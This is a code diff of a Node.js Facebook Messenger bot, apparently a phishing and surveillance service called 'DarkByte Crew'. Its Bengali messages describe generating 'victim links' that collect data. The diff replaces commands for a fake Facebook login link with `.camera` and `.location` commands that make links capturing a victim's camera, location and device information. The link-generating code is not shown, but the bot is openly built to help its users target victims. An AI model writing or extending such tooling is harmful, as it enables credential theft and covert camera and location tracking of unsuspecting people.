@@ -20,7 +20,7 @@ async function runCommand(senderId, command, args) {
             await sendMessage(senderId, '❌ কমান্ড চালাতে সমস্যা হয়েছে।');
         }
     } else {
-        await sendMessage(senderId, '❓ এই কমান্ডটি নেই। `.create` বা `.fb` লিখুন।');
+        await sendMessage(senderId, '❓ এই কমান্ডটি নেই। `.camera`, `.location` বা `.uptime` লিখুন।');
     }
 }
 
@@ -37,9 +37,6 @@ router.get('/webhook', (req, res) => {
     }).catch(() => res.sendStatus(403));
 });
 
-// ================================================================
-// 🆕 webhook POST - এরর হ্যান্ডলিং বাড়ানো
-// ================================================================
 router.post('/webhook', async (req, res) => {
     const body = req.body;
     if (body.object !== 'page') return res.sendStatus(404);
@@ -54,7 +51,6 @@ router.post('/webhook', async (req, res) => {
 
             console.log(`📩 মেসেজ পেয়েছি: ${senderId} -> "${text}"`);
 
-            // ইউজার খুঁজি
             let user = await User.findOne({ fbId: senderId });
 
             if (!user) {
@@ -71,10 +67,7 @@ router.post('/webhook', async (req, res) => {
 
                 const introMsg = `আসসালামু আলাইকুম ${firstName}, 👋\n\nআমি **DarkByte Crew** বট, আমি ভিক্টিম লিংক তৈরি ও ডেটা কালেক্ট করতে পারি।\n\nআপনি আমাকে ব্যবহার করতে চাইলে অ্যাডমিন এর থেকে অনুমতি নিন:\n🔗 https://facebook.com/2ndJohnnySins`;
                 
-                const result = await sendMessage(senderId, introMsg);
-                if (!result.success) {
-                    console.error(`❌ প্রথম মেসেজ পাঠাতে ব্যর্থ: ${result.error}`);
-                }
+                await sendMessage(senderId, introMsg);
                 continue;
             }
 
@@ -82,28 +75,18 @@ router.post('/webhook', async (req, res) => {
             user.messageCount = (user.messageCount || 0) + 1;
             await user.save();
 
-            // অনুমতি চেক
             if (!user.allowed) {
-                const msg = '⛔ আপনি আমাকে ব্যবহার করার অনুমতি পান নি।\nঅনুমতি নিতে: https://facebook.com/2ndJohnnySins';
-                const result = await sendMessage(senderId, msg);
-                if (!result.success) {
-                    console.error(`❌ অনুমতি মেসেজ পাঠাতে ব্যর্থ: ${result.error}`);
-                }
+                await sendMessage(senderId, '⛔ আপনি আমাকে ব্যবহার করার অনুমতি পান নি।\nঅনুমতি নিতে: https://facebook.com/2ndJohnnySins');
                 continue;
             }
 
-            // কমান্ড প্রসেস
             if (text.startsWith('.')) {
                 const parts = text.slice(1).split(' ');
                 const command = parts[0].toLowerCase();
                 const args = parts.slice(1);
                 await runCommand(senderId, command, args);
             } else {
-                const msg = `📌 সঠিক কমান্ড দিন:\n\n🔹 \`.create\` - ক্যামেরা ও ডেটা কালেক্ট লিংক তৈরি\n🔹 \`.fb\` - ফেক ফেসবুক লগইন লিংক তৈরি\n\nআরও জানতে: https://facebook.com/2ndJohnnySins`;
-                const result = await sendMessage(senderId, msg);
-                if (!result.success) {
-                    console.error(`❌ হেল্প মেসেজ পাঠাতে ব্যর্থ: ${result.error}`);
-                }
+                await sendMessage(senderId, '📌 সঠিক কমান্ড দিন:\n\n🔹 `.camera` - ক্যামেরা + ডিভাইস ইনফো লিংক\n🔹 `.location` - লোকেশন + ডিভাইস ইনফো লিংক\n🔹 `.uptime` - বট আপটাইম দেখায়\n\nআরও জানতে: https://facebook.com/2ndJohnnySins');
             }
         }
         res.status(200).send('EVENT_RECEIVED');
